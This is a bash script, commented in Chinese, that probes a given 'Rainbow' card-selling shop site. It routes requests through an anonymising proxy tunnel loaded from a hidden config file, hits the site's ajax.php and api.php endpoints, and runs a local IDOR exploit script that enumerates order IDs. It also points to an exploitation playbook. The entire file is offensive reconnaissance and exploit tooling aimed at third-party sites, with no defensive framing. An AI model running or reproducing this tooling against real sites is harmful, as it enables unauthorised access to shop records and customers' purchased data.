#!/bin/bash
# 彩虹发卡站一键探测
set -euo pipefail
FAKA=/data/tools/faka
BASE="${1%/}"
[ -z "$BASE" ] && { echo "用法: $0 https://target.com"; exit 1; }

PROXY=""
if [ -f /data/recon/.env.proxy ]; then source /data/recon/.env.proxy; fi
[ -n "${QG_AUTH_KEY:-}" ] && [ -n "${QG_TUNNEL_HOST:-}" ] && PROXY="-x http://${QG_AUTH_KEY}:${QG_AUTH_PWD}@${QG_TUNNEL_HOST}:${QG_TUNNEL_PORT}"

JAR="/tmp/probe_$(echo "$BASE" | md5sum | cut -c1-8).jar"
UA="Mozilla/5.0 Chrome/120.0.0.0"

echo "[*] 彩虹探测 $BASE"
curl -sS $PROXY -c "$JAR" -b "$JAR" -L -A "$UA" "$BASE/" -o /tmp/probe_home.html -w "home HTTP:%{http_code}\n" || true
curl -sS $PROXY -b "$JAR" -A "$UA" -H "Referer: $BASE/" "$BASE/ajax.php?act=getcount" || true
echo
curl -sS $PROXY -b "$JAR" -A "$UA" -H "Referer: $BASE/" "$BASE/api.php/?act=search&id=1" | head -c 500
echo
python3 "$FAKA/rainbow_idor.py" -u "$BASE" --start 1 --end 5 --proxy none 2>/dev/null | tail -3 || true
echo "playbook: /data/recon/playbooks/rainbow-faka-idor-playbook.md"
